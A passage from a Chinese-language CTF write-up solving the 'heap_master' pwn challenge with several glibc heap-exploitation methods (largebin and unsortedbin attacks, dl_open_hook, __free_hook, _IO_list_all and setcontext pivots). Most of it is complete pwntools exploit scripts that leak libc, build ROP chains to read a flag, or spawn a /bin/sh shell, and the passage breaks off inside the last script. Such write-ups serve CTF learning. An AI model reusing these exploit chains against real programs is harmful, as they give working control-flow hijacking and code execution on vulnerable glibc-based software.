dl_open_hook的方法来劫持程序控制流，利用largebin_attack将dl_open_hook覆盖为victim的地址，因为当malloc和free报错时，会调用__libc_dlopen_mode函数，在其中会将dl_open_hook的值赋给一个寄存器，然后会call [寄存器]，也就等于是call [victim_addr]，所以我们可以在victim的地址处填好one_gadget或者gadgets来劫持程序控制流。 因为dl_open_hook赋值给的寄存器因libc版本不同而不同，我们调试发现在libc2.25中赋值给的寄存器是rbx。调试确定是哪个寄存器的方法是： rwatch *addr_dl_open_hook c 程序会卡到*addr_dl_open_hook参与操作的那一条指令。我们可以发现在libc2.25是rbx，libc2.23是rax。 我们发现在libc2.25下发现了： 1230x7FD7D: mov rdi, [rbx+48h] mov rsi, r13 call qword ptr [rbx+40h] 这个gadget我们可以完全控制住rdi和程序执行流，和setcontext+53结合，我们可以控制所有寄存器并劫持栈。 在libc-2.23版本下，我们可以找到如下gadget: 12.text:000000000006D98A mov rdi, rax.text:000000000006D98D call qword ptr [rax+20h] 所以大致思路相同，在这里只放出2.25的exp。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) choice = 2 #1. one_gadget 全部失败 2. orw if choice == 1: one_gadget = [0x40bdb,0x40c2f,0xd9925] upgrade(offset,p64(libcbase+one_gadget[2])) if choice == 2: ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret ''' mygadget = 0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; p_rdi = libcbase + 0x1feea p_rdx_rsi = libcbase + 0xf9619 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,4, #我flag打开之后文件操作符是4，具体情况自己调试 p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['write'], ] upgrade(0,'./flag\x00\x00'+flat(orw)) upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x10)+p64(p_rdi)) #gdb.attach(p) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 第三种方法：思路：第三种方法主要与前面的泄露方式不同。 第三种方法是先利用unsortedbin_attack/largebin_attack将任意地址修改为victim的地址，我们准备改写global_fast_max，然后突破fastbinY[]的限制，产生fastbin_index_overflow将stdout流modify为某一处mmap的地址（我们事先已应在这里伪造好一个fake_IO_2_1_stdout结构体），然后有1/16的概率可以成功泄露。 这种方法的exp本体来源：https://paper.seebug.org/935/，其中值得注意的一点是其用到了__morecore来进行了一个巧妙的劫持，如下： 123456789101112131415161718190x7f09c5962308 &lt;main_arena+2024&gt;: 0x00007f09c59622f8 0x00007f09c59622f80x7f09c5962318 &lt;main_arena+2040&gt;: 0x00007f09c5962308 0x00007f09c59623080x7f09c5962328 &lt;main_arena+2056&gt;: 0x00007f09c5962318 0x00007f09c59623180x7f09c5962338 &lt;main_arena+2072&gt;: 0x00007f09c5962328 0x00007f09c59623280x7f09c5962348 &lt;main_arena+2088&gt;: 0x00007f09c5962338 0x00007f09c59623380x7f09c5962358 &lt;main_arena+2104&gt;: 0x00007f09c5962348 0x00007f09c59623480x7f09c5962368 &lt;main_arena+2120&gt;: 0x00007f09c5962358 0x00007f09c59623580x7f09c5962378 &lt;main_arena+2136&gt;: 0x0000000000000000 0x00000000000000000x7f09c5962388 &lt;main_arena+2152&gt;: 0x00007f09c5961b20 0x00000000000000000x7f09c5962398 &lt;main_arena+2168&gt;: 0x0000000000000001 0x00000000000210000x7f09c59623a8 &lt;main_arena+2184&gt;: 0x000000008b2f3000 0x00007f09c56248c00x7f09c56248c0 &lt;__GI___default_morecore&gt;: sub rsp,0x80x7f09c56248c4 &lt;__GI___default_morecore+4&gt;: call 0x7f09c5699e80 &lt;__GI___sbrk&gt;0x7f09c56248c9 &lt;__GI___default_morecore+9&gt;: mov edx,0x00x7f09c56248ce &lt;__GI___default_morecore+14&gt;: cmp rax,0xffffffffffffffff0x7f09c56248d2 &lt;__GI___default_morecore+18&gt;: cmove rax,rdx0x7f09c56248d6 &lt;__GI___default_morecore+22&gt;: add rsp,0x80x7f09c56248da &lt;__GI___default_morecore+26&gt;: ret 由代码可见，在main_arena+2024处，*（main_arena+2024+0xa8）为__GI_default_morecore函数，而这个函数我们调试看一下，其实就等于是一个ret的gadget，因为sub rsp,0x8和add rsp,0x8抵消了，所以我们把main_arena+2024作为setcontext+53的初始rdi，并在main_arena+2024+0xa0处利用fastbin_index_overflow设为我们构造好rop_chain的地址，当setcontext+53的最后我们的程序执行流跳到*(rdi+0xa8)时（此时rsp已经指向rop_chain），我们就等于跳到了一个ret的gadget上，所以程序直接开始执行rop_chain。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172#coding:utf-8from pwn import *p = process('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context(os='linux',arch='amd64')context.terminal = ['terminator','-x','sh','-c']def new(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size))def upgrade(off,cont): p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(off)) p.sendlineafter('size: ', str(len(cont))) p.sendafter('content: ', cont) def delete(off): p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(off))def exp(): for i in range(0xe): upgrade(0xf8 + i*0x10,p64(0x201)) for i in range(0x10): upgrade(0x2f8 + i*0x10,p64(0x21)) for i in range(0xd): delete(0x1d0-i*0x10) new(0x1f0) upgrade(0x100, p64(0xfbad1800) + p16(0x26a3)) upgrade(0x110,p16(0x26a3)) upgrade(0x118,p16(0x26a3)) upgrade(0x120,p16(0x2618)) upgrade(0x128,p16(0x26a3)) upgrade(0x130,p16(0x26a3)) upgrade(0x138,p16(0x26a3)) upgrade(0x140,p16(0x26a3)) upgrade(0x148, p64(0)*4 + p16(0x18e0)) upgrade(0x170, p64(1) + p64(0xffffffffffffffff) + p64(0xa000000) + p16(0x3780)) upgrade(0x190, p64(0xffffffffffffffff) + p64(0) + p16(0x17a0)) upgrade(0x1a8,p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p16(0x06e0)) #~~~~~~~~~~~~~~~~~~~~~~fake_IO_2_1_stdout_create_success and begin unsortedbin_attack~~~~~~~~~~~~~~~~~~~~~~~~~ upgrade(0x1000+8,p64(0x91)) upgrade(0x1000+8+0x90,p64(0x21)) upgrade(0x1000+8+0x90+0x20,p64(0x21)) delete(0x1010) global_max_fast = 0x37f8 upgrade(0x1018,p16(global_max_fast-0x10)) #unsortbin attack global_max_fast new(0x80) upgrade(0x100+8,p64(0x17e1)) upgrade(0x100+8+0x17e0,p64(0x21)) upgrade(0x100+8+0x17e0+0x20,p64(0x21)) delete(0x110) libcbase = u64(p.recv(6).ljust(8,'\x00')) - 3946208 log.success('libcbase = '+hex(libcbase)) IO_str_j = libcbase + libc.sym['_IO_file_jumps']+0xc0 morecore = libcbase + libc.sym['__morecore'] - 8 - 0xa0 log.success('_IO_str_jumps = '+hex(IO_str_j)) log.success('morecore = '+hex(morecore)) setcontext = libcbase + 293749 log.success('setcontext = '+hex(setcontext)) upgrade(0x2008,p64(0x1411)) # unsortedbin_attack modify _IO_list_all to mmap+0x2000 upgrade(0x3418,p64(0x21)) delete(0x2010) _IO_FILE = ( p64(0) + p64(0)*3 + p64(0) + # + 0x20 write_base p64(0x7fffffffffffffff) + # write_ptr p64(0x0) + p64(0) + # + 0x38 buf_base p64((morecore - 100) / 2) + # rdi buf_end p64(0)*0x12 + p64(IO_str_j) + # + 0xd8 p64(setcontext)) #构造方法看前面的部分 upgrade(0x2000,_IO_FILE) upgrade(0x3000+8,p64(0x1121)) #unsortedbin_attack modify morecore+0xa0 to mmap+0x3000 upgrade(0x3000+8+0x1120,p64(0x21)) delete(0x3010) ''' 0x7ff5bae14b75 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ff5bae14b7c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ff5bae14b83 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ff5bae14b87 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ff5bae14b8b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ff5bae14b8f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ff5bae14b93 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ff5bae14b97 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ff5bae14b9e &lt;setcontext+94&gt;: push rcx 0x7ff5bae14b9f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ff5bae14ba3 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ff5bae14baa &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ff5bae14bb1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ff5bae14bb5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ff5bae14bb9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ff5bae14bbd &lt;setcontext+125&gt;: xor eax,eax 0x7ff5bae14bbf &lt;setcontext+127&gt;: ret ''' pop_rax = libcbase + 0x0000000000033544 pop_rdi = libcbase + 0x0000000000021102 pop_rsi = libcbase + 0x00000000000202e8 pop_rdx = libcbase + 0x0000000000001b92 syscall = libcbase + 0x00000000000bc375 buf = libcbase + 3954496 rop = (p64(pop_rax) + p64(0) + # read "/flag" ; open read write p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x100) + p64(syscall) + p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buf) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall) + p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(100) + p64(syscall) + p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(100) + p64(syscall)) upgrade(0x3000,rop) ''' 0x7f09c5962308 &lt;main_arena+2024&gt;: 0x00007f09c59622f8 0x00007f09c59622f8 0x7f09c5962318 &lt;main_arena+2040&gt;: 0x00007f09c5962308 0x00007f09c5962308 0x7f09c5962328 &lt;main_arena+2056&gt;: 0x00007f09c5962318 0x00007f09c5962318 0x7f09c5962338 &lt;main_arena+2072&gt;: 0x00007f09c5962328 0x00007f09c5962328 0x7f09c5962348 &lt;main_arena+2088&gt;: 0x00007f09c5962338 0x00007f09c5962338 0x7f09c5962358 &lt;main_arena+2104&gt;: 0x00007f09c5962348 0x00007f09c5962348 0x7f09c5962368 &lt;main_arena+2120&gt;: 0x00007f09c5962358 0x00007f09c5962358 0x7f09c5962378 &lt;main_arena+2136&gt;: 0x0000000000000000 0x0000000000000000 0x7f09c5962388 &lt;main_arena+2152&gt;: 0x00007f09c5961b20 0x0000000000000000 0x7f09c5962398 &lt;main_arena+2168&gt;: 0x0000000000000001 0x0000000000021000 0x7f09c59623a8 &lt;main_arena+2184&gt;: 0x000000008b2f3000 0x00007f09c56248c0 0x7f09c56248c0 &lt;__GI___default_morecore&gt;: sub rsp,0x8 0x7f09c56248c4 &lt;__GI___default_morecore+4&gt;: call 0x7f09c5699e80 &lt;__GI___sbrk&gt; 0x7f09c56248c9 &lt;__GI___default_morecore+9&gt;: mov edx,0x0 0x7f09c56248ce &lt;__GI___default_morecore+14&gt;: cmp rax,0xffffffffffffffff 0x7f09c56248d2 &lt;__GI___default_morecore+18&gt;: cmove rax,rdx 0x7f09c56248d6 &lt;__GI___default_morecore+22&gt;: add rsp,0x8 0x7f09c56248da &lt;__GI___default_morecore+26&gt;: ret ''' p.sendline("0") # trigger on exit() time.sleep(0.1) p.send("./flag\x00") p.interactive()if __name__ == '__main__' : while True: try : exp() break except: p.close() p = process('./heap_master') 第四种方法：思路：第四种方法和前面的方法不同点主要在于劫持程序控制流，泄露的方法在前面都已经明确了，在此就不赘述。 第四种方法劫持程序执行流的方法是先改写global_fast_max，然后向free_hook放入victim的地址，然后在victim处构造一个chunk，在这个chunk的fd指针处改为system_addr，将这个chunk申请出来，这时system_addr就放入了free_hook中，然后再构造一个chunk，使其首八个字节为&#39;/bin/sh\x00&#39;，free()其即可打开shell。 exp如下(libc-2.23)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *context(os='linux',arch='amd64')context.terminal = ['terminator','-x','sh','-c']#context.log_level = 'debug'p = process('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size))def upgrade(offset,content): p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(offset)) p.sendlineafter('size: ', str(len(content))) p.sendafter('content: ', content) def delete(offset): p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(offset))def exp(): offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- global_max_fast_addr = libcbase + (0x7f6c57ea37f8 - 0x7f6c57add000) log.success('global_max_fast_addr = '+hex(global_max_fast_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x20)) delete(offset+0x10) new(0x60) fastbin_ptr = libcbase+(0x7fc6d8510b20-0x7fc6d814c000)+8 log.success('fastbin_ptr = '+hex(fastbin_ptr)) target_addr = libcbase+libc.sym['__free_hook'] log.success('free_hook_addr ='+hex(target_addr)) idx = (target_addr-fastbin_ptr)/8 size = idx*0x10 + 0x20 offset = 0x2000 upgrade(offset+8,p64(size+1)) upgrade(offset+8+size,p64(0x31)+'/bin/sh\x00') upgrade(offset+8+size+0x30,p64(0x31)) delete(offset+0x10) upgrade(offset+8+8,p64(libcbase+libc.sym['system'])) new(size-0x10) delete(offset+size+0x10) p.interactive()if __name__ == '__main__' : while True: try : exp() break except : p.close() p = process('./heap_master') 第五种方法：思路：第五种方法也是劫持程序控制流方法不同。 第五种方法我们在泄露之后，改写_IO_list_all来控制程序控制流之后，利用_IO_str_overflow来跳到setcontext+53，然后控制寄存器调用mprotect来改写mmap段的权限，然后在mmap上注入shellcode。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 